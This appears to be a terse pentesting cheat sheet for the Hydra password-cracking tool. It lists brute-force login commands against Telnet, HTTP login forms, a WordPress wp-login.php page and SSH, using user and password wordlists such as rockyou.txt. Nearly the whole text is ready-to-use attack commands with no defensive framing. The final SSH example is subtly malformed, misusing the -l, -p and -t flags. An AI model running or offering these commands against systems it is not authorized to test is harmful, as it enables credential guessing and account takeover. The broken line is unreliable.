# Hydra

`hydra -L users.txt -P pass.txt <service://server> <options>`

Telnet:
- `hydra -L users.txt -P pass.txt telnet://target.server`

HTTP:
- `hydra -L users.txt -P pass.txt http-get://localhost/`
- `hydra -L users.txt -P pass.txt -t 10 -o result-attack.txt targetsite.com http-get-form "/login.php:username=^USER^&password=^PASS^&login=Username and/or password incorrect."`
- `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=<success_response>'`
 
SSH:
- `hydra -l user -P pass.txt -t 10 172.21.0.0 ssh -s 22`
- `hydra -l users.txt -p /usr/share/wordlists/rockyou.txt -t 172.21.0.0 ssh -s 22`